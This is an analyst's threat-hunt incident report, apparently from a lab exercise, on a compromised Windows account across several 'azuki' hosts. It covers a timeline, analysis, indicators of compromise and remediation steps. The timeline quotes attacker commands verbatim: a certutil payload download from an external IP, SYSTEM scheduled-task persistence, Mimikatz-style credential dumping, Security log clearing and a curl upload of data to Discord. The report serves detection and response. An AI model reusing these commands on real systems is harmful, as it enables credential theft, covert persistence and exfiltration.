# Threat Hunt Incident Report

**Device(s):** azuki-sl, azuki-logks, azuki-kslog, azuki-logistics  
**User(s):** kenji.sato  
**Date Range:** November 18–20, 2025  
**Analyst:** Matthew Faustino-Page

---

## 1. Overview

During routine threat hunting activities, suspicious activity was observed on multiple devices within the environment associated with the account `kenji.sato`. The indicators included unauthorized remote logins, execution of reconnaissance commands, creation of hidden files, persistence mechanisms, Windows Defender exclusions, credential harvesting attempts, and exfiltration of data to external endpoints.  

The investigation utilized Microsoft Defender for Endpoint data (`DeviceProcessEvents`, `DeviceRegistryEvents`, `DeviceFileEvents`, `DeviceNetworkEvents`) to reconstruct the attack timeline and identify potential compromise.  

**Primary Findings:**
- Unauthorized remote logon from external IP (`88.97.178.12`) on `azuki-logks`.  
- Execution of network discovery and system enumeration commands.  
- Creation of hidden files and folders under `C:\ProgramData\WindowsCache`.  
- Modification of Windows Defender exclusion paths and processes.  
- Execution of scripts and binaries from external URLs (`78.141.196.6`).  
- Scheduled task creation for persistence (`schtasks.exe`).  
- Credential harvesting attempts using `mm.exe`.  
- Exfiltration of data to external service (`discord.com`).  
- Event log clearing with `wevtutil.exe`.  
- Creation of new user accounts via `net1.exe`.  

---

## 2. Timeline of Activity

| Timestamp | Device | Activity | Detail |
|-----------|--------|---------|--------|
| Nov 18, 2025 5:29 PM | azuki-logistics | File download | `certutil.exe -urlcache -f http://78.141.196.6:8080/AdobeARM.exe C:\ProgramData\Adobe\Updates\AdobeARM.exe` |
| Nov 18, 2025 5:30 PM | azuki-logistics | Network connection | Connected to remote IP `78.141.196.6` port 443 (likely C2 download) |
| Nov 19, 2025 5:10 AM | azuki-logks | Persistence | Created scheduled task: `"schtasks.exe /create /tn \"Windows Update Check\" /tr C:\ProgramData\WindowsCache\svchost.exe /sc onlogon /ru SYSTEM /f"` |
| Nov 19, 2025 5:15 AM | azuki-logks | File creation | Executable `mm.exe` created in `C:\ProgramData\WindowsCache` |
| Nov 19, 2025 7:00 AM | azuki-logks | Remote logon | User `kenji.sato` logged in from `kali` (88.97.178.12, public IP) |
| Nov 19, 2025 7:02 AM | azuki-logks | Reconnaissance | Executed `ARP.EXE -a` via `explorer.exe` |
| Nov 19, 2025 7:13 AM | azuki-logks | File/Folder manipulation | Ran `attrib.exe +h +s C:\ProgramData\WindowsCache` (hidden system files) |
| Nov 19, 2025 7:17 AM | azuki-logks | Windows Defender modification | Added `C:\ProgramData\WindowsCache` and `svchost.exe` to exclusion paths |
| Nov 19, 2025 9:19 AM | azuki-kslog | File creation | Created `export-data.zip` via PowerShell in `C:\ProgramData\WindowsCache` |
| Nov 19, 2025 11:09 AM | azuki-sl | Data exfiltration | Uploaded `export-data.zip` to `discord.com` using `curl.exe` |
| Nov 19, 2025 11:11 AM | azuki-sl | Event log tampering | Cleared Security log using `wevtutil.exe cl Security` |
| Nov 19, 2025 11:09 AM | azuki-sl | Account manipulation | Created new user `support` via `net1.exe` |
| Nov 19, 2025 11:08 AM | azuki-sl | Credential harvesting | `mm.exe privilege::debug sekurlsa::logonpasswords exit` executed |
| Nov 19, 2025 10:49 AM | azuki-sl | Script download | `wupdate.ps1` downloaded from `http://78.141.196.6:8080/wupdate.ps1` |
| Nov 19, 2025 11:10 AM | azuki-sl | Credentials stored | Executed `cmdkey.exe /generic:10.1.0.188 /user:fileadmin /pass:**********` |
| Nov 19, 2025 11:08 AM | azuki-sl | Remote desktop | Executed `mstsc` or `.rdp` sessions for lateral movement |

---

## 3. Analysis

1. **Initial Access:** Likely via compromised credentials on `azuki-logks` from a remote host (`88.97.178.12`).  
2. **Execution & Reconnaissance:** Standard Windows tools (`ARP.EXE`, `netstat`, `ipconfig`) were executed to enumerate network and system information.  
3. **Persistence:** Scheduled tasks (`schtasks.exe`) and hidden folders/files (`attrib.exe +h +s`) in `C:\ProgramData\WindowsCache` maintained access.  
4. **Defense Evasion:** Modifications to Windows Defender exclusions prevented detection of malicious executables (`svchost.exe`, `mm.exe`). Event log clearing via `wevtutil.exe` hid activity.  
5. **Credential Access:** `mm.exe` and `cmdkey.exe` indicate harvesting of user credentials for further lateral movement.  
6. **Exfiltration:** Compressed data (`export-data.zip`) sent over HTTPS to `discord.com`, a non-standard exfiltration channel.  
7. **Lateral Movement:** Creation of new user accounts (`support`) and RDP/mstsc sessions indicate attempts to expand access.  
8. **Indicators of Compromise (IoCs):**  
   - IPs: `88.97.178.12`, `78.141.196.6`, `162.159.135.232`  
   - File paths: `C:\ProgramData\WindowsCache\mm.exe`, `export-data.zip`  
   - Scheduled task name: `Windows Update Check`  
   - PowerShell script: `wupdate.ps1`  

---

## 4. Recommendations

**Immediate Response:**  
- Disable `kenji.sato` account and any unauthorized accounts (`support`).  
- Isolate affected systems (`azuki-sl`, `azuki-logks`, `azuki-kslog`, `azuki-logistics`) from the network.  
- Terminate malicious processes (`mm.exe`, `svchost.exe` in WindowsCache).  

**Remediation:**  
- Remove malicious scheduled tasks.  
- Restore Windows Defender exclusions to default.  
- Audit and restore Event Logs.  
- Perform full malware scan on all affected devices.  

**Post-Incident Actions:**  
- Change passwords for compromised accounts and any shared credentials.  
- Review firewall and network logs for additional external connections.  
- Investigate any potential lateral movement to other hosts.  
- Implement monitoring for unusual PowerShell, scheduled task creation, and WindowsCache folder access.  

---
